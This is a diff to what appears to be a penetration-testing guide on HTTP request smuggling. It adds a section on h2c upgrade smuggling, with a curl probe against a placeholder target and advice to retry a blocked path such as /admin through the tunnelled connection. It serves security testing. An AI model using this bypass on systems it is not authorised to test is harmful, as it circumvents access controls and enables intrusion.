@@ -99,6 +99,17 @@ curl --http2 https://TARGET/ \
 
 Confirm desync with a harmless smuggled probe path (e.g. `GET /404-proof`) before testing sensitive routes.
 
+**HTTP/2 cleartext upgrade (h2c) smuggling** — distinct from HTTP/2 desync: a front-end proxy that blindly forwards an `Upgrade: h2c` handshake lets the client tunnel a raw HTTP/2 connection to the back-end, bypassing front-end routing/access controls:
+
+```bash
+# Probe whether the proxy forwards the h2c upgrade to an unguarded back-end
+curl -v --http2-prior-knowledge http://TARGET/ \
+  -H "Connection: Upgrade, HTTP2-Settings" \
+  -H "Upgrade: h2c" \
+  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA"
+# If the upgrade succeeds end-to-end, retry a front-end-blocked path (e.g. /admin) over the tunneled h2c stream.
+```
+
 ## Common False Alarms
 
 - Single-layer architecture: direct client-to-application with no proxy in between
